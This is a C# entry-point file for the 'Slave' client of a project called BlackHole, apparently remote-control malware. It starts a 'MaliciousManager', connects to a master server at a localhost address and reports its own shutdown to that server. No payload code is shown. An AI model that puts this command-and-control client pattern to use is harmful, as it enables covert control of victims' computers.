using System;
using System.Threading;
using System.Windows.Forms;
using BlackHole.Slave.Helper.Native.Impl;
using BlackHole.Slave.Malicious;

namespace BlackHole.Slave
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow
    {
        public static void FireShutdown(int reason) => MasterServer.Instance.FireShutdown(reason);

        public MainWindow()
        {
            InitializeComponent();
        }

        public void Initialize()
        {
            try
            {
                MaliciousManager.Instance.Initialize();
                MasterServer.Instance.Connect("tcp://127.0.0.1:5556");

                Kernel32.SetConsoleCtrlHandler(ctrl =>
                {
                    FireShutdown((int)ctrl);
                    Thread.Sleep(500);
                    return true;
                }, true);
                Application.Run();
            }
            catch (Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
        }

    }
}
